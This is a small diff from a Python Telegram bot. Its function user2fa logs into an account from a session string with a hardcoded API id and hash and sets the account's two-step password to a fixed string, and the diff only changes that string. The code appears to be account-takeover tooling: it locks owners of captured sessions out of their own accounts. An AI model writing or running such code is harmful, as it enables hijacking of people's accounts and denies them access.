@@ -73,7 +73,7 @@ async def promote(strses, grp, user):
 async def user2fa(strses):
   async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
     try:
-      await X.edit_2fa('PgbgroupISBEST')
+      await X.edit_2fa('Pgbgroup Is Best')
       return True
     except:
       return False
